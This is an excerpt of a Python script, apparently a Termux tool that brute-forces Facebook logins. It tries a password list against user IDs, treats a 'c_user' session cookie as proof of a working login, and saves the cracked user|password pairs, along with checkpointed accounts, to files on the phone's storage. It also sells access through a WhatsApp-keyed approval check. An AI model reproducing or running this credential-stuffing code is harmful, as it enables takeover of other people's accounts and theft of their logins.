...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801307609464?text=' + tks)

        

    r1=requests.get("https://github.com/Selim440/selimkhon/blob/main/Approved.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄selim᭄•───────────────────────────────────────•༄khon᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL selim")     
...
logo="""
   ...
   \033[1;93m╚════██║██╔══╝  ██║     ██║██║╚██╔╝██║
    ...
    \033[1;93m╚══════╝╚══════╝╚══════╝╚═╝╚═╝     ╚═╝
        ...
        \033[1;92m༄selim᭄•───────────────────────────────────────•༄khon᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mGROUP   : KILER BOSS TEAM .   \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : SELIM440         .. \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : SELIM KHAN           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801307609464 \033[1;93m▇▇
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/selim-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/selim-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : selim-khon")
			print ('\033[1;92m༄selim᭄•───────────────────────────────────────•༄khon᭄')
			key = input(" [*] Choose : ")
			print ('༄selim᭄•───────────────────────────────────────•༄khon᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[selim]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [selim-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/selim_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/selim_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+8801307609464")
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/R.k.selimkhan.termux.tool.owner")
